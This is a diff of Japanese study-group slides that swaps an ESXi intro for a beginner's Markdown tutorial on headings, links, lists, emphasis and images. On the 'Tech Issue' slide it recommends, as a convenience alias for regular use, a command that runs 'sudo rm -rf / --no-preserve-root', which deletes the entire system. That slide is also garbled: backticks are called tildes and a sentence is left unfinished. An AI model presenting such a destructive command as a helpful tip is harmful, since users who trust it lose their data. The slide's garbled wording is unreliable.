@@ -1,29 +1,111 @@
-# VMWareのESXiを触ってみる。
+# MarkDownを触ってみる。
+
+--- 
+
+# Markdownについて
+
+- 基本は「改行一つは改行されない」と思え！
+- `#` 記号の後は「半角スペース」
+- `<link>` は「使えるフレーバーと使えないフレーバー」があるぞ！
+    - 特に「github系以外のフレーバ」は気をつけろ！
+    - リンクは `[表示文字列](URL)` かな
+    - [ぐーぐる](http://www.google.co.jp)
+- マークアップと何が違うんだ！！！！
+    - <a href="uri">囲まなくていい</a>
+    - そもそも「方向性が違う」
+        - Upは装飾方向、Downは書かない方向
 
 ---
 
-## 必要なもの
-・[VMware Workstation 14 Player](https://my.vmware.com/jp/web/vmware/free#desktop_end_user_computing/vmware_workstation_player/14_0 )
-(※要アカウント登録)
+# どこで使われてる？
 
-・[VMware vSphere6.0u2](https://my.vmware.com/jp/group/vmware/info?slug=datacenter_cloud_infrastructure/vmware_vsphere/6_5) (※要アカウント登録)
-
-・[Tera Term](https://ja.osdn.net/projects/ttssh2/)
+- GitHub
+- Qiita
+- 当勉強会wiki
 
 ---
 
-## ESXiってなに？
-x86サーバー仮想化ソフトウエアの代名詞「VMware ESXi」が、2008年7月より無償提供されたもの。
-現在は[VMware vSphere Hypervisor] という名前で提供されている。
+# #増やすごとに段下げ
+
+- そうです `#` ひとつが `h1` みたいなイメージです
 
 ---
 
-## 実際に触ってみよう！！
+# Tech Issue
 
-##　仮想マシンの作成
+" ``` " (チルダ3つ)を強調したいところの始まりと
 
+また、常用する方は、以下のようにエイリアスにしとけばよろしかろう。
 
+```
+alias bals='sudo rm -rf / --no-preserve-root
+```
 
-+++
+#　言語系は「スニペット」になる。　（Wikiではならない）
 
-Adiós!
+```python=
+for i in range(10):
+    print(i)
+```
+
+---
+
+# 項目
+
+”- ”　を先頭につける。
+
+- よっこら
+- しょっと
+- どっこいしょ
+- それでも株は抜けません
+
+---
+
+# 文字の協調
+
+- 強調したい部分を＊（アスタリスク）で囲む
+    - 囲む＊の量で太さが変化
+
+- **Strong** *Zero*
+
+---
+
+# 画像
+
+- 画像を出す場合は `![caption](画像URL)`
+
+- ![barson](https://s.gravatar.com/avatar/7a791a1858b90dde2b6d8b268fdea1d9?s=80)
+
+---
+
+# 数字リスト
+
+## 例１
+
+1. 手順１
+1. 手順２
+1. 手順３
+
+## 例2
+
+3. 一()個目だけは任意
+0. あとは
+0. インクリメントを示すために
+0. 無味乾燥に
+
+---
+
+# 勉強会ログについて
+
+- 個人的には普段 `MarkDown` を使わないのでそれがつらい　（某氏）
+    - markdown 使わなくてもただのメモでもOK！
+    - 誰かが変換してくれます。
+    - 改行だけはきっちりやリましょう。
+
+---
+
+# 宿題
+インフラ勉強会の[Wikiページ](https://wiki.infra-workshop.tech)に登録し
+自分のプロフィールページを作成してください。
+
+---
